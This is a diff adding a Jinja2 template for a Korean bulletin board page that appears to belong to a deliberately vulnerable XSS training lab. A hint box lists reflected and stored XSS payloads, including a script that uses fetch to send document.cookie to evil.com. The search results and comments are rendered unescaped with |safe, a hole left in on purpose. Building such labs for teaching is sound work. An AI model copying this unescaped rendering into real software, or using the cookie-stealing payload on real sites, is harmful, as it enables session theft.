@@ -1,0 +1,54 @@
+{% extends "base.html" %}
+{% block title %}— 게시판{% endblock %}
+{% block content %}
+<div class="card">
+  <div class="card-title">게시판 <span class="vuln-badge">Reflected XSS</span> <span class="vuln-badge">Stored XSS</span></div>
+  <div class="hint">
+    <strong>Reflected XSS</strong> (URL 파라미터):<br>
+    • <code>/board?search=&lt;script&gt;alert('XSS')&lt;/script&gt;</code><br>
+    • <code>/board?search=&lt;img src=x onerror=alert(document.cookie)&gt;</code><br><br>
+    <strong>Stored XSS</strong> (댓글 입력):<br>
+    • 댓글에 <code>&lt;script&gt;fetch('https://evil.com/?c='+document.cookie)&lt;/script&gt;</code> 입력
+  </div>
+
+  <!-- Reflected XSS: search 파라미터를 |safe로 렌더링 -->
+  {% if search %}
+  <div class="alert alert-ok">
+    검색 결과: <span>{{ search | safe }}</span>
+  </div>
+  {% endif %}
+
+  <form method="GET" style="display:flex;gap:10px;margin-bottom:20px;">
+    <input type="text" name="search" placeholder="검색어 입력 (Reflected XSS 테스트)..." style="flex:1;">
+    <button type="submit" class="btn btn-sec">검색</button>
+  </form>
+
+  <hr style="border-color:var(--border);margin-bottom:20px;">
+
+  <div class="card-title">댓글 작성 <span class="vuln-badge">Stored XSS</span></div>
+  <form method="POST">
+    <div class="form-group">
+      <label>내용 (이스케이프 없이 저장됨)</label>
+      <textarea name="content" placeholder="댓글을 입력하세요... 또는 XSS 페이로드"></textarea>
+    </div>
+    <button type="submit" class="btn">등록</button>
+  </form>
+</div>
+
+<div class="card">
+  <div class="card-title">댓글 목록</div>
+  {% if comments %}
+  {% for c in comments %}
+  <div style="background:var(--surface2);padding:12px;margin-bottom:8px;border-radius:2px;border-left:2px solid var(--border);">
+    <div style="font-size:10px;color:var(--muted);margin-bottom:6px;">
+      {{ c[1] or '익명' }} · {{ c[3] }}
+    </div>
+    <!-- 취약: 댓글 내용을 |safe로 렌더링 → Stored XSS -->
+    <div style="font-size:13px;">{{ c[2] | safe }}</div>
+  </div>
+  {% endfor %}
+  {% else %}
+  <div style="color:var(--muted);font-size:12px;">댓글이 없습니다.</div>
+  {% endif %}
+</div>
+{% endblock %}
